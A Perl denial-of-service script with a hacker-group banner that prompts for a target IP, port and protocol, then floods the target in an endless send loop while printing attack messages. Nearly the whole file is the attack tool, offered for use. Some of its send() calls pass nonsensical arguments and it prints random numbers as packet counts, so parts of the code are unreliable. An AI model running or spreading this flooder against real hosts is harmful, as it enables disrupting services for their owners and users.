#!/usr/bin/perl

use IO::Socket;

system("clear || cls");
#Script Banner================================================================
print q{
                   .-"      "-.
                  /            \
                 |    JOKER11   |
                 |,  .-.  .-.  ,|
                 | )(__/  \__)( |
                 |/     /\     \|
       (@_       (_     ^^     _)
  _     ) \_______\__|IIIIII|__/__________________________
 (_)@8@8{}<________|-\IIIIII/-|_A_N_O_N_Y_M_O_U_S_A_R_A_B_>
        )_/        \          /
       (@           `--------` Welcome!

 [---]   by:> OSEID ALDARY   [---]
 [---]   Version:> 1.5	     [---]
};
# INPUT TARGET INFO ==============================================
print "\n===============================";
print "\n[~] Enter TargetIP: "; # Set Target IP
$host = <STDIN>;
chomp ($host);
while ($host eq ""){
 print "   [!] Enter TargetIP?: ";
 $host = <STDIN>;
 chomp ($host);
}
print "TRAGET ==> $host";
print "\n===============================";
print "\n[~] Enter Port: "; # Set Port
$port = <STDIN>;
chomp ($port);
while ($port eq ""){ 
 print "   [!] Enter PORT?: ";       
 $port = <STDIN>;
 chomp ($port); 
}
print "PORT ==> $port";
print "\n===============================";
print "\n[~] Enter Protockol (TCP or UDP) :"; # Set Protockol;
$proto = <STDIN>;
chomp ($proto);
while ($proto eq ""){
 print "   [!] Enter Protockol (TCP or UDP) ?: ";
 $proto = <STDIN>;
 chomp ($proto);
}
print "Protocol ==> $proto";
print "\n===============================";
sleep(2);
system("clear || cls");
print "\n[*]Attack Has Been Start On [$host:$port] proto => [$proto].......\n\n";
sleep(3);

{
$sock = IO::Socket::INET->new (
	PeerAddr => $host,
	PeerPort => $port,
	Proto => "$proto" ) || die "\n[!] Something Went Wrong ";
}
packets:
while (1) {
$size = rand() * 8921873 * 99919988;
print ("  Packets sent: $size\n");
send($sock, 999999999999999999999999999, $size); 
packets2:
$size = rand() * 8921873 * 99919988 * 2;
print "Flooding:";
send($sock, 999999999999999999999999999, $size);
packet3:
$size = rand() * 8921873 * 99919988 * 2 + 99919988;
print " (=>$host:$port~$proto<=)";
send($sock, $size, $size); # Attack start################

}

##############################################################
#####################                #########################
#####################  END OF SCRIPT #########################
#####################                #########################
##############################################################
#This Script by Oseid Aldary
#Have a nice day :)
#GoodBye

